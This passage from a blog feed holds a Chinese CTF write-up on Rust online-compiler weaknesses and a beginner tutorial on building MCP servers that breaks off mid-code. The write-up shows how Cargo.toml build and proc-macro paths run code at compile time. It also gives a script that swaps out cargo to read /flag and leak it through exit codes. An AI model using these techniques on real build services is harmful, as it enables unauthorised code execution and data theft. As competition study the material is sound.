        <content type="html"><![CDATA[<h1 id="rust在线编译项目常见漏洞"><a href="#rust在线编译项目常见漏洞" class="headerlink" title="rust在线编译项目常见漏洞"></a>rust在线编译项目常见漏洞</h1><p>近年来，随着Rust语言在高性能、内存安全等领域的优势被广泛认可，越来越多的开发者选择将其应用于后端开发，尤其在WebAssembly、微服务和高并发场景中表现亮眼。然而，Rust生态的快速扩张也带来了新的安全挑战：尽管语言本身通过所有权机制规避了内存安全问题，但Web应用层的逻辑漏洞（如SQL注入、身份验证绕过）、第三方库的潜在缺陷（如未充分审计的<code>unsafe</code>代码滥用）以及对安全实践的过度自信（如忽略输入验证或错误配置CORS策略），正在导致Rust相关的Web安全问题逐渐浮出水面。社区亟需在享受Rust底层安全红利的同时，建立更完善的安全开发规范，加强依赖库审计，并推动Web框架的漏洞响应机制，以应对日益复杂的安全威胁。而本次就是在阿里ctf中出现的一道rust编译类题目，故总结了一套相关的相关知识。</p><h2 id="跨项目引用"><a href="#跨项目引用" class="headerlink" title="跨项目引用"></a>跨项目引用</h2><p>在Rust生态中，<code>Cargo.toml</code>文件如同项目的<strong>中枢神经</strong>，扮演着至关重要的<strong>清单（Manifest）</strong>角色。其不仅是一份静态的配置文件，还是是开发者与Rust编译工具链（Cargo）之间的核心。通过toml，开发者能够以声明式语法精确控制项目——从定义包元数据（如版本、作者、许可证）、声明依赖关系（通过本地路径、Git仓库或官方注册表[crates.io]引入第三方crate），到定制编译策略（如特性开关、优化级别、目标平台配置），甚至扩展自定义构建脚本。</p><p>实现跨项目引用的核心机制，则隐藏在<code>Cargo.toml</code>的特定字段中：</p><h3 id="dependence引用"><a href="#dependence引用" class="headerlink" title="dependence引用"></a>dependence引用</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[dependencies]</span><br><span class="line">项目名称 = &#123;path = &quot;本地路径&quot;&#125;</span><br><span class="line">项目名称 = &#123;git = &quot;git项目地址&quot;&#125;</span><br><span class="line">项目名称 = &#123;version = &quot;版本&quot;&#125;</span><br></pre></td></tr></table></figure><h3 id="引用本地过程"><a href="#引用本地过程" class="headerlink" title="引用本地过程"></a>引用本地过程</h3><p>Rust的过程宏（Procedural Macros）是元编程（metaprogramming）的核心工具之一，允许开发者在<strong>编译时</strong>对代码进行动态生成和转换。与声明宏（Declarative Macros）不同，过程宏通过<strong>自定义代码逻辑</strong>直接操作抽象语法树（AST），实现更复杂的代码生成能力。以下是过程宏的深度解析，而我们也可以通过<code>Cargo.toml</code>对其进行引用</p><p>那么如果现在存在一个文件夹拥有如下的rust项目的文件夹。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">├─testaaa</span><br><span class="line">│  ├─.idea</span><br><span class="line">│  ├─src</span><br><span class="line">│  └─Cargo.toml</span><br><span class="line">│     </span><br><span class="line">└─testbbb</span><br><span class="line">    ├─.idea</span><br><span class="line">    ├─src</span><br><span class="line">    └─Cargo.toml</span><br></pre></td></tr></table></figure><p>那么此时可以通过在testaaa项目的Cargo.toml中使用</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[lib]</span><br><span class="line">proc-macro = ture</span><br><span class="line">path = &quot;../[项目名称]/main.rs&quot;</span><br></pre></td></tr></table></figure><p>来对其他的过程宏项目进行引用。利用这个方法，可以实现在引用的项目中不使用lib.rs，来生成proc-macro。如此一来我们遍可以在项目a的main.rs里实现过程宏，虽然不能被正常编译，但是可以在项目b中引用，从而实现编译。</p><p>当然不仅这些，如果rust启用了一些unstable特性，如（metabuild等），这些功能也会在未来可能成为利用的关键点</p><h2 id="编译执行"><a href="#编译执行" class="headerlink" title="编译执行"></a>编译执行</h2><p>rust的编译存在以下三种执行</p><ul><li>过程宏编译执行 </li><li>build.rs执行 </li><li>编译时计算（不能利用）const fn</li></ul><p>而其中build构建执行和过程宏编译时执行是常可以利用的项，他们可以实现通过编译就进行一些命令的执行。</p><h3 id="利用Cargo-toml实现main-rs自执行"><a href="#利用Cargo-toml实现main-rs自执行" class="headerlink" title="利用Cargo.toml实现main.rs自执行"></a>利用Cargo.toml实现main.rs自执行</h3><p>很多时候我们无法自己创建build.rs，但是可以利用Cargo.toml中的选项。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">build = &quot;路径&quot;</span><br></pre></td></tr></table></figure><p>我们可以将build的路径换成任何我们想要的rs文件（<strong>包括 main.rs ！</strong>我们可以通过这点在很多有限制的地方进行执行）从而实现build.rs执行。</p><p>不只是这种情况，前面我们提到过rust的依赖选项，rust通过从crates.io下载源码或读取本机的源码编译。那么此时这些crates中的build.rs文件也会进行运行，我们也可以通过这种方式进行利用</p><h3 id="利用过程宏"><a href="#利用过程宏" class="headerlink" title="利用过程宏"></a>利用过程宏</h3><p>在Cargo.toml中启用</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[lib]</span><br><span class="line">proc-macro = ture</span><br><span class="line">path = &quot;&quot;</span><br></pre></td></tr></table></figure><p>来引用过程宏或开启过程宏来运行，这里巧妙的是，cargo会直接对path的目标文件进行rustc编译，也就是说，即使目标文件的结构并不符合rust项目的标准，只要rust代码没有错误都可以将其作为过程宏生成。</p><h2 id="替换编译器、资源"><a href="#替换编译器、资源" class="headerlink" title="替换编译器、资源"></a>替换编译器、资源</h2><p>很多情况我们并不能正常回显或是不能正常的触发一个程序，那么我们可以通过“挖空”程序本体，换入我们的代码，这样一来，程序就可以通过流程的调用来触发。</p><p>以下是linux中rustc和cargo的常见位置</p><h4 id="系统级"><a href="#系统级" class="headerlink" title="系统级"></a>系统级</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">~/.cargo/bin/         # rustc, cargo, rustup 等可执行文件</span><br><span class="line">~/.cargo/registry/    # 下载的依赖缓存</span><br><span class="line">~/.cargo/config.toml  # Cargo 配置文件</span><br></pre></td></tr></table></figure><h4 id="用户级"><a href="#用户级" class="headerlink" title="用户级"></a>用户级</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">~/.rustup/toolchains/  # 不同版本工具链</span><br><span class="line"># 例如：</span><br><span class="line">~/.rustup/toolchains/stable-x86_64-unknown-linux-gnu/</span><br><span class="line">~/.rustup/toolchains/nightly-x86_64-unknown-linux-gnu/</span><br><span class="line"></span><br><span class="line">~/.cargo/bin/         # rustc, cargo, rustup 等可执行文件</span><br><span class="line">~/.cargo/registry/    # 下载的依赖缓存</span><br><span class="line">~/.cargo/config.toml  # Cargo 配置文件</span><br></pre></td></tr></table></figure><p>下面就是一个替换内容的例子，将cargo替换为以下的脚本，这个脚本将会把flag作为错误状态码依次返回（运行一次返回一次），我们便可以通过不断运行编译流程，此时返回的错误码就为flag的ascii码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">#!/bin/sh</span><br><span class="line"></span><br><span class="line">STATE=&quot;/tmp/state.txt&quot;</span><br><span class="line"></span><br><span class="line">if [ ! -f &quot;$STATE&quot; ]; then</span><br><span class="line">    echo 0 &gt; &quot;$STATE&quot;</span><br><span class="line">fi</span><br><span class="line"></span><br><span class="line">FLAG=$(cat /flag)</span><br><span class="line">IDX=$(cat &quot;$STATE&quot;)</span><br><span class="line">CHAR=$(echo &quot;$FLAG&quot; | cut -c$((IDX + 1)))</span><br><span class="line"></span><br><span class="line">if [ -z &quot;$CHAR&quot; ]; then</span><br><span class="line">    exit 255</span><br><span class="line">fi</span><br><span class="line"></span><br><span class="line">ASCII=$(printf &quot;%d&quot; &quot;&#x27;$CHAR&quot;)</span><br><span class="line">NEXT_IDX=$((IDX + 1))</span><br><span class="line"></span><br><span class="line">echo &quot;$NEXT_IDX&quot; &gt; &quot;$STATE&quot;</span><br><span class="line">exit $ASCII</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 赛后复盘 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf </tag>
            
            <tag> web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>安全开发-mcp-learn-1</title>
      <link href="/2025/03/13/%E5%AE%89%E5%85%A8%E5%BC%80%E5%8F%91-mcp-learn-1/"/>
      <url>/2025/03/13/%E5%AE%89%E5%85%A8%E5%BC%80%E5%8F%91-mcp-learn-1/</url>
      
        <content type="html"><![CDATA[<h2 id="什么是MCP"><a href="#什么是MCP" class="headerlink" title="什么是MCP"></a>什么是MCP</h2><p>MCP 起源于 2024 年 11 月 25 日 Anthropic发布的文章：<a href="https://www.anthropic.com/news/model-context-protocol">Introducing the Model Context Protocol</a>。</p><p>MCP （Model Context Protocol，模型上下文协议）定义了应用程序和 AI 模型之间交换上下文信息的方式。这使得开发者能够<strong>以一致的方式将各种数据源、工具和功能连接到 AI 模型</strong>（一个中间协议层），就像 USB-C 让不同设备能够通过相同的接口连接一样。MCP 的目标是创建一个通用标准，使 AI 应用程序的开发和集成变得更加简单和统一。</p><p><strong>想象一下没有 MCP 之前我们会怎么做</strong>？我们可能会人工从数据库中筛选或者使用工具检索可能需要的信息，手动的粘贴到 prompt 中。随着我们要解决的问题越来越复杂，<strong>手工</strong>把信息引入到 prompt 中会变得越来越困难。</p><p>为了克服手工 prompt 的局限性，许多 LLM 平台（如 OpenAI、Google）引入了 <code>function call</code> 功能。这一机制允许模型在需要时调用预定义的函数来获取数据或执行操作，显著提升了自动化水平。</p><h2 id="MCP的结构"><a href="#MCP的结构" class="headerlink" title="MCP的结构"></a>MCP的结构</h2><ul><li><strong>MCP Hosts</strong>: 像 Claude Desktop、IDEs 或 AI 工具这样的程序，它们希望通过 MCP 访问资源</li><li><strong>MCP Clients</strong>: 维护与服务器 1:1 连接的协议客户端</li><li><strong>MCP Servers</strong>: 轻量级程序，通过标准化的 Model Context Protocol 暴露特定功能</li><li><strong>Local Resources</strong>: 你的计算机资源（数据库、文件、服务），MCP 服务器可以安全地访问这些资源</li><li><strong>Remote Resources</strong>: 通过互联网可用的资源（例如，通过 APIs），MCP 服务器可以连接到这些资源</li></ul><h2 id="创建MCP-Server"><a href="#创建MCP-Server" class="headerlink" title="创建MCP Server"></a>创建MCP Server</h2><p>使用uv创建应该环境</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uvx create-mcp-server --path 路径</span><br></pre></td></tr></table></figure><p>然后按照它的提示一步步创建即可，并添加对它的依赖</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uv add httpx python-dotenv</span><br></pre></td></tr></table></figure><h2 id="编写MCP"><a href="#编写MCP" class="headerlink" title="编写MCP"></a>编写MCP</h2><p>进入项目的src&#x2F;项目同名文件夹，可以看到有以下创建好的两个python文件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Mode                 LastWriteTime         Length Name</span><br><span class="line">----                 -------------         ------ ----</span><br><span class="line">-a----         2025/3/11     19:15           5076 server.py</span><br><span class="line">-a----         2025/3/11     19:15            220 __init__.py</span><br></pre></td></tr></table></figure><p>其中我们进去会发现它已经为我们写好一个可以使用的例子了，但是我们还是需要了解其中内容的结构的。</p><p>首先是server部分，这是mcp能实现功能的关键部分</p><h3 id="资源部分"><a href="#资源部分" class="headerlink" title="资源部分"></a>资源部分</h3><p>当你想让ai访问本地&#x2F;线上资源的时候，ai怎么知道有哪些资源可以访问？又该如何阅读？资源部分就是为了解决这个问题而诞生的，我们只需要为ai声明阅读的uri并实现阅读的方法，就能进行资源使用。</p><h4 id="资源声明结构"><a href="#资源声明结构" class="headerlink" title="资源声明结构"></a>资源声明结构</h4><p>这是资源声明的格式</p><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  <span class="attr">uri</span>: <span class="built_in">string</span>;           <span class="comment">// 资源的唯一标识符</span></span><br><span class="line">  <span class="attr">name</span>: <span class="built_in">string</span>;          <span class="comment">// 人类可读的名称</span></span><br><span class="line">  description?: <span class="built_in">string</span>;  <span class="comment">// 可选描述</span></span><br><span class="line">  mimeType?: <span class="built_in">string</span>;     <span class="comment">// 可选 MIME 类型</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  <span class="attr">uriTemplate</span>: <span class="built_in">string</span>;   <span class="comment">// 遵循 RFC 6570 的 URI 模板</span></span><br><span class="line">  <span class="attr">name</span>: <span class="built_in">string</span>;          <span class="comment">// 此类型的人类可读名称</span></span><br><span class="line">  description?: <span class="built_in">string</span>;  <span class="comment">// 可选描述</span></span><br><span class="line">  mimeType?: <span class="built_in">string</span>;     <span class="comment">// 所有匹配资源的可选 MIME 类型</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>格式的 URI 进行标识：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[protocol]://[host]/[path]</span><br></pre></td></tr></table></figure><p>例如：</p><ul><li><code>file:///home/user/documents/report.pdf</code></li><li><code>postgres://database/customers/schema</code></li><li><code>screen://localhost/display1</code>(获取屏幕信息)</li></ul><p>创建资源标识可以使得资源被ai发现阅览，而这一过程通过以下两个函数传递</p><h4 id="list-resources"><a href="#list-resources" class="headerlink" title="list_resources()"></a>list_resources()</h4><p>这个函数的作用是将资源以列表的列表传递给大模型</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@app.list_resources()</span></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">list_resources</span>() -&gt; <span class="built_in">list</span>[types.Resource]:</span><br><span class="line">    <span class="keyword">return</span> [</span><br><span class="line">        <span class="comment"># 直接资源，这里给出的uri是确定的，ai只需要对uri进行选择</span></span><br><span class="line">        types.Resource(</span><br><span class="line">            uri=<span class="string">&quot;uri路径&quot;</span>,</span><br><span class="line">            name=<span class="string">&quot;资源名称&quot;</span>,</span><br><span class="line">            mimeType=<span class="string">&quot;资源类型&quot;</span></span><br><span class="line">        )</span><br><span class="line">        <span class="comment"># 资源模板，这里的uri是ai根据RFC 6570 的 URI 模板进行自动输入，详情 https://rfc2cn.com/rfc6570.html</span></span><br><span class="line">        types.Resource(</span><br><span class="line">            uriTemplate=<span class="string">&quot;uri路径&quot;</span>,</span><br><span class="line">            name=<span class="string">&quot;资源名称&quot;</span>,</span><br><span class="line">            mimeType=<span class="string">&quot;资源类型&quot;</span></span><br><span class="line">        )</span><br><span class="line">    ]</span><br></pre></td></tr></table></figure><h4 id="read-resource"><a href="#read-resource" class="headerlink" title="read_resource()"></a>read_resource()</h4><p>处理并阅读其中的资源，将其以自定义的形式返回的大模型</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@app.read_resource()</span></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">read_resource</span>(<span class="params">uri: AnyUrl</span>) -&gt; <span class="built_in">str</span>:</span><br><span class="line">    <span class="comment"># 根据ai要访问的资源路径进行处理，这里的uri则是由ai生成</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">str</span>(uri) == <span class="string">&quot;file:///logs/app.log&quot;</span>:   <span class="comment"># 此处根据上面资源文件或是资源模板的uri进行判断来选择执行不同的资源处理</span></span><br><span class="line">        log_contents = <span class="keyword">await</span> read_log_file() <span class="comment"># 任意函数处理文件，最终以string的格式返回给ai</span></span><br><span class="line">        <span class="keyword">return</span> log_contents</span><br><span class="line"></span><br><span class="line">    <span class="keyword">raise</span> ValueError(<span class="string">&quot;资源未找到&quot;</span>)</span><br></pre></td></tr></table></figure><h3 id="工具部分"><a href="#工具部分" class="headerlink" title="工具部分"></a>工具部分</h3><h4 id="工具结构"><a href="#工具结构" class="headerlink" title="工具结构"></a>工具结构</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  name: string;          // 工具的唯一标识符</span><br><span class="line">  description?: string;  // 人类可读的描述</span><br><span class="line">  inputSchema: &#123;         // 工具参数的 JSON Schema</span><br><span class="line">    type: &quot;object&quot;,</span><br><span class="line">    properties: &#123; ... &#125;  // 工具特定的参数</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="list-tools实现工具列表"><a href="#list-tools实现工具列表" class="headerlink" title="list_tools实现工具列表"></a>list_tools实现工具列表</h4><p>这个函数的作用是告诉ai可以使用的工具</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@server.list_tools()</span></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">handle_list_tools</span>() -&gt; <span class="built_in">list</span>[types.Tool]:</span><br><span class="line">    <span class="keyword">return</span> [</span><br><span class="line">        types.Tool(</span><br><span class="line">            name=<span class="string">&quot;工具函数名&quot;</span>,</span><br><span class="line">            description=<span class="string">&quot;工具的描述&quot;</span>,</span><br><span class="line">            inputSchema=&#123;</span><br><span class="line">                <span class="string">&quot;type&quot;</span>: <span class="string">&quot;object&quot;</span>,</span><br><span class="line">                <span class="string">&quot;properties&quot;</span>: &#123;</span><br><span class="line">                    <span class="string">&quot;变量名1&quot;</span>: &#123;</span><br><span class="line">                        <span class="string">&quot;type&quot;</span>: <span class="string">&quot;string&quot;</span>,</span><br><span class="line">                        <span class="string">&quot;description&quot;</span>:<span class="string">&quot;变量信息描述&quot;</span></span><br><span class="line">                    &#125;,</span><br><span class="line">                    <span class="string">&quot;变量名2&quot;</span>: &#123;<span class="string">&quot;type&quot;</span>: <span class="string">&quot;string&quot;</span>&#125;,</span><br><span class="line">                &#125;,</span><br><span class="line">                <span class="string">&quot;required&quot;</span>: [<span class="string">&quot;变量名1&quot;</span>, <span class="string">&quot;变量名2&quot;</span>],</span><br><span class="line">            &#125;,</span><br><span class="line">        )</span><br><span class="line">    ]</span><br><span class="line"></span><br></pre></td></tr></table></figure><h4 id="handle-call-tool"><a href="#handle-call-tool" class="headerlink" title="handle_call_tool"></a>handle_call_tool</h4><p>这个函数将根据ai的返回进行分析处理并返回给ai</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@server.call_tool()</span></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">handle_call_tool</span>(<span class="params"></span></span><br><span class="line"><span class="params">    name: <span class="built_in">str</span>, arguments: <span class="built_in">dict</span> | <span class="literal">None</span></span></span><br><span class="line"><span class="params"></span>) -&gt; <span class="built_in">list</span>[types.TextContent | types.ImageContent | types.EmbeddedResource]:</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    Handle tool execution requests.</span></span><br><span class="line"><span class="string">    Tools can modify server state and notify clients of changes.</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">if</span> name != <span class="string">&quot;函数名&quot;</span>: <span class="comment">#判断当前ai调用的函数</span></span><br><span class="line">        <span class="keyword">raise</span> ValueError(<span class="string">f&quot;Unknown tool: <span class="subst">&#123;name&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> arguments:<span class="comment">#判断是否输入进参数（参数以dict的格式传入）</span></span><br><span class="line">        <span class="keyword">raise</span> ValueError(<span class="string">&quot;Missing arguments&quot;</span>)</span><br><span class="line"></span><br><span class="line">    变量名<span class="number">1</span> = arguments.get(<span class="string">&quot;变量名1&quot;</span>)</span><br><span class="line">    变量名<span class="number">2</span> = arguments.get(<span class="string">&quot;变量名2&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 可以添加调用其他的处理函数</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> [</span><br><span class="line">        types.TextContent(</span><br><span class="line">            <span class="built_in">type</span>=<span class="string">&quot;text&quot;</span>,</span><br><span class="line">            text=<span class="string">f&quot;返回给ai的内容&quot;</span>,</span><br><span class="line">        )</span><br><span class="line">    ]</span><br></pre></td></tr></table></figure><h3 id="提示部分"><a href="#提示部分" class="headerlink" title="提示部分"></a>提示部分</h3><p>我们给了大模型工具的可以访问的资源，但是和人一样，面临很多新的名词可能无法进行理解，如何使用就成了新的问题，提示部分就好比一本说明书，对那些名词进行说明并告知大模型应该怎样进行运行。</p><p>这一过程分为两个部分：</p><ol><li>发现提示</li><li>使用提示</li></ol><h4 id="提示部分结构"><a href="#提示部分结构" class="headerlink" title="提示部分结构"></a>提示部分结构</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  name: string;              // 提示的唯一标识符</span><br><span class="line">  description?: string;      // 人类可读的描述</span><br><span class="line">  arguments?: [              // 可选的参数列表</span><br><span class="line">    &#123;</span><br><span class="line">      name: string;          // 参数标识符</span><br><span class="line">      description?: string;  // 参数描述</span><br><span class="line">      required?: boolean;    // 参数是否必需</span><br><span class="line">    &#125;</span><br><span class="line">  ]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="定义提示"><a href="#定义提示" class="headerlink" title="定义提示"></a>定义提示</h4><p>那我们如何在python中写这个功能呢？首先需要根据提示结构一个提示的静态变量，用来说明有哪些提示</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">PROMPTS = &#123;</span><br><span class="line">    <span class="string">&quot;git-commit&quot;</span>: types.Prompt(</span><br><span class="line">        name=<span class="string">&quot;git-commit&quot;</span>,</span><br><span class="line">        description=<span class="string">&quot;生成 Git 提交消息&quot;</span>,</span><br><span class="line">        arguments=[</span><br><span class="line">            types.PromptArgument(</span><br><span class="line">                name=<span class="string">&quot;changes&quot;</span>,</span><br><span class="line">                description=<span class="string">&quot;Git diff 或更改描述&quot;</span>,</span><br><span class="line">                required=<span class="literal">True</span></span><br><span class="line">            )</span><br><span class="line">        ],</span><br><span class="line">    ),</span><br><span class="line">    <span class="string">&quot;explain-code&quot;</span>: types.Prompt(</span><br><span class="line">        name=<span class="string">&quot;explain-code&quot;</span>,</span><br><span class="line">        description=<span class="string">&quot;解释代码如何工作&quot;</span>,</span><br><span class="line">        arguments=[</span><br><span class="line">            types.PromptArgument(</span><br><span class="line">                name=<span class="string">&quot;code&quot;</span>,</span><br><span class="line">                description=<span class="string">&quot;要解释的代码&quot;</span>,</span><br><span class="line">                required=<span class="literal">True</span></span><br><span class="line">            ),</span><br><span class="line">            types.PromptArgument(</span><br><span class="line">                name=<span class="string">&quot;language&quot;</span>,</span><br><span class="line">                description=<span class="string">&quot;编程语言&quot;</span>,</span><br><span class="line">                required=<span class="literal">False</span></span><br><span class="line">            )</span><br><span class="line">        ],</span><br><span class="line">    )</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="传递提示列表"><a href="#传递提示列表" class="headerlink" title="传递提示列表"></a>传递提示列表</h4><p>生成提示列表则是为了让ai知晓存在那些提示</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@app.list_prompts()</span></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">list_prompts</span>() -&gt; <span class="built_in">list</span>[types.Prompt]:</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">list</span>(PROMPTS.values())</span><br></pre></td></tr></table></figure><p>大模型会对server端进行一次询问</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">// 请求</span><br><span class="line">&#123;</span><br><span class="line">  method: &quot;prompts/list&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>此时list_prompts则会返回我们的提示信息</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">// 响应</span><br><span class="line">&#123;</span><br><span class="line">  prompts: [</span><br><span class="line">    &#123;</span><br><span class="line">      name: &quot;analyze-code&quot;,</span><br><span class="line">      description: &quot;分析代码以寻找潜在的改进&quot;,</span><br><span class="line">      arguments: [</span><br><span class="line">        &#123;</span><br><span class="line">          name: &quot;language&quot;,</span><br><span class="line">          description: &quot;编程语言&quot;,</span><br><span class="line">          required: true</span><br><span class="line">        &#125;</span><br><span class="line">      ]</span><br><span class="line">    &#125;</span><br><span class="line">  ]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="get-prompt解析提示"><a href="#get-prompt解析提示" class="headerlink" title="get_prompt解析提示"></a>get_prompt解析提示</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span 